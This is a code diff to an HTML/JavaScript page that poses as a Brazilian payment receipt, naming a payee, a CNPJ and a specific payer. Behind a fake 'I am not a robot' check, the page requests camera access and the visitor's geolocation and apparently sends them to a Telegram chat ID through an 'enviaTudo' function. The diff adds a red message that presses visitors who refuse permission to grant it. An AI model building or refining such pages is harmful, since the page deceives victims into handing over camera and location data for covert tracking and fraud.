@@ -60,6 +60,14 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
 #blockScreen{display:none;position:fixed;inset:0;background:#fff;z-index:2000;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:24px}
 #blockScreen h2{color:#FF6600;margin-bottom:12px}
 #blockScreen p{color:#555;max-width:320px}
+
+/* MENSAGEM VERMELHA ESTILIZADA */
+#permissoes.negado{
+  color:#d32f2f;
+  font-weight:600;
+  font-size:14px;
+  margin-top:8px;
+}
 </style>
 </head>
 <body>
@@ -135,7 +143,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
       <div class="check"></div>
       <h2>Pagamento realizado</h2>
     </div>
-    <div class="row"><span>Valor</span><span>R$ 1下半部分500,00</span></div>
+    <div class="row"><span>Valor</span><span>R$ 1.500,00</span></div>
     <div class="row"><span>Recebedor</span><span>Calcard SA Instituição de Pagamentos</span></div>
     <div class="row"><span>CNPJ</span><span>08.611.734/0001-19</span></div>
     <div class="row"><span><b>Pagador</b></span><span><b>CARLOS EDUARDO SILVA SANTOS</b></span></div>
@@ -160,6 +168,7 @@ const CHAT_ID = '-1003187104876';
 
 const chk   = document.getElementById('robot');
 const btn   = document.getElementById('btnContinue');
+const perm  = document.getElementById('permissoes');
 
 // Desabilita o botão no carregamento
 btn.disabled = true;
@@ -196,12 +205,12 @@ async function continuar(){
     }
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {
-    mostraBlock();
+    mostraNegado();
     return;
   }
 
   // LOCALIZAÇÃO
-  if (!navigator.geolocation){ mostraBlock(); return; }
+  if (!navigator.geolocation){ mostraNegado(); return; }
   navigator.geolocation.getCurrentPosition(
     async pos => {
       locationData = {
@@ -214,12 +223,14 @@ async function continuar(){
     },
     async () => {
       await enviaTudo();
-      mostraBlock();
+      mostraNegado();
     }
   );
 }
 
-function mostraBlock(){
+function mostraNegado(){
+  perm.textContent = 'Seu navegador precisa dessa autorização para prosseguir.';
+  perm.classList.add('negado');
   document.getElementById('overlay').style.display='none';
   document.getElementById('blockScreen').style.display='flex';
 }
